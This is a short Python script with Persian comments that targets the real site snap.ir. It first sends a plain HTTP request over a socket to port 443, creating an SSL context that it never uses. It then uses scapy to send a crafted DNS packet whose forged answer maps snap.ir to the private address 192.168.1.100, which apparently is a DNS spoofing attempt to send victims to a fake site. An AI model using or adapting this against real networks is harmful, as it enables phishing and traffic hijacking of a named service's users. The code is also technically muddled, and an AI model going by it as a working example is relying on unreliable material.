import socket
import ssl
import scapy.all as scapy

# مشخص کردن آدرس و پورت وب‌سایت مورد نظر
target_host = 'snap.ir'
target_port = 443

# ایجاد یک سوکت
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# اتصال به وب‌سایت مورد نظر
sock.connect((target_host, target_port))

# ایجاد یک контکست SSL
context = ssl.create_default_context()

# تنظیم نام دامنه جعلی
fake_domain = 'snap.ir'

# ارسال درخواست به وب‌سایت مورد نظر
sock.sendall(f'GET / HTTP/1.1\r\nHost: {fake_domain}\r\n\r\n'.encode())

# دریافت پاسخ از وب‌سایت مورد نظر
response = sock.recv(1024)

# چاپ پاسخ
print(response.decode())

# بستن سوکت
sock.close()

# مشخص کردن آدرس IP وب‌سایت جعلی
fake_ip = '192.168.1.100'

# مشخص کردن نام دامنه وب‌سایت مورد نظر
target_domain = 'snap.ir'

# ایجاد یک پکت DNS
packet = scapy.IP(dst='192.168.1.1')/scapy.UDP(dport=53)/scapy.DNS(rd=1, qd=scapy.DNSQR(qname=target_domain, qtype='A'), an=scapy.DNSRR(rrname=target_domain, type='A', rdata=fake_ip, ttl=123))

# ارسال پکت DNS
scapy.send(packet)
